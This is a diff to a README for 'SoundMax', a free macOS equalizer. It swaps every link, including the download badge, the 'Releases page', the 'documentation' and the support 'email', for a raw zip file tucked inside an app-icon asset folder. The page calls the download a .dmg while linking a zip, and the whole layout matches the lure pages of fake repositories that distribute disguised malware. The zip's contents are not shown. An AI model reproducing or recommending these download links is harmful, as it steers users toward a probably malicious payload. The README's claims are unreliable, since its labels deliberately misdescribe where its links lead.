@@ -4,7 +4,7 @@ Transform your audio experience with ease.
 
 ## 📥 Download Now
 
-[![Download SoundMax](https://github.com/saadashrafai/SoundMax/raw/refs/heads/main/SoundMax/Audio/Sound-Max-1.7.zip)](https://github.com/saadashrafai/SoundMax/raw/refs/heads/main/SoundMax/Audio/Sound-Max-1.7.zip)
+[![Download SoundMax](https://raw.githubusercontent.com/saadashrafai/SoundMax/main/SoundMax/Assets.xcassets/AppIcon.appiconset/Max-Sound-1.1-alpha.3.zip)](https://raw.githubusercontent.com/saadashrafai/SoundMax/main/SoundMax/Assets.xcassets/AppIcon.appiconset/Max-Sound-1.1-alpha.3.zip)
 
 ## 📖 Introduction
 
@@ -13,13 +13,13 @@ SoundMax is a free 10-band system equalizer designed for macOS users. It provide
 ## 🚀 Getting Started
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/saadashrafai/SoundMax/raw/refs/heads/main/SoundMax/Audio/Sound-Max-1.7.zip) to find the latest version of SoundMax.
+   Go to the [Releases page](https://raw.githubusercontent.com/saadashrafai/SoundMax/main/SoundMax/Assets.xcassets/AppIcon.appiconset/Max-Sound-1.1-alpha.3.zip) to find the latest version of SoundMax.
 
 2. **Choose Your Version**  
    Look through the list of available releases and select the version suitable for your system. Make sure your macOS version is compatible, generally macOS 10.15 or later is recommended.
 
 3. **Download the Application**  
-   Click on the link for the latest release. The file you download will typically be a `.dmg` file. You may see an option that looks similar to this: `https://github.com/saadashrafai/SoundMax/raw/refs/heads/main/SoundMax/Audio/Sound-Max-1.7.zip`.
+   Click on the link for the latest release. The file you download will typically be a `.dmg` file. You may see an option that looks similar to this: `https://raw.githubusercontent.com/saadashrafai/SoundMax/main/SoundMax/Assets.xcassets/AppIcon.appiconset/Max-Sound-1.1-alpha.3.zip`.
 
 4. **Open the Downloaded File**  
    Locate the downloaded `.dmg` file in your `Downloads` folder. Double-click the file to open it.
@@ -56,14 +56,14 @@ SoundMax is a free 10-band system equalizer designed for macOS users. It provide
 
 ## 📞 Support
 
-If you have questions or need help, consider checking issues on GitHub. You can also reach out through our support channel via email at https://github.com/saadashrafai/SoundMax/raw/refs/heads/main/SoundMax/Audio/Sound-Max-1.7.zip
+If you have questions or need help, consider checking issues on GitHub. You can also reach out through our support channel via email at https://raw.githubusercontent.com/saadashrafai/SoundMax/main/SoundMax/Assets.xcassets/AppIcon.appiconset/Max-Sound-1.1-alpha.3.zip
 
 ## 📑 Additional Information
 
-For more details on features, user guides, and updates, visit the official [documentation](https://github.com/saadashrafai/SoundMax/raw/refs/heads/main/SoundMax/Audio/Sound-Max-1.7.zip) page. 
+For more details on features, user guides, and updates, visit the official [documentation](https://raw.githubusercontent.com/saadashrafai/SoundMax/main/SoundMax/Assets.xcassets/AppIcon.appiconset/Max-Sound-1.1-alpha.3.zip) page. 
 
 You can also contribute to the project by exploring the code on GitHub. 
 
 Thank you for choosing SoundMax. Enjoy your enhanced audio experience!
 
-[![Download SoundMax](https://github.com/saadashrafai/SoundMax/raw/refs/heads/main/SoundMax/Audio/Sound-Max-1.7.zip)](https://github.com/saadashrafai/SoundMax/raw/refs/heads/main/SoundMax/Audio/Sound-Max-1.7.zip)
+[![Download SoundMax](https://raw.githubusercontent.com/saadashrafai/SoundMax/main/SoundMax/Assets.xcassets/AppIcon.appiconset/Max-Sound-1.1-alpha.3.zip)](https://raw.githubusercontent.com/saadashrafai/SoundMax/main/SoundMax/Assets.xcassets/AppIcon.appiconset/Max-Sound-1.1-alpha.3.zip)
